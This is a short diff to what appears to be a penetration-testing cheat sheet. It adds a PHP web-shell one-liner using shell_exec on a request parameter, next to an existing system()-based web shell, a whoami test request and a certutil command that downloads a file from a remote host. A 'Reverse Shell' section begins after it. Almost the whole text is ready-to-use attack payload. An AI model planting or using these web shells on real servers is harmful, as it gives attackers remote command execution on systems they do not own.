@@ -183,6 +183,10 @@ certutil.exe -urlcache -split -f "$RHOST" outfile.zip
 <?php system($_REQUEST['cmd']); ?>
 xxx.php?cmd=whoami
 ```
+or
+```
+<?php echo shell_exec($_REQUEST["cmd"]); ?>
+```
 
 ## Reverse Shell
 ### PHP
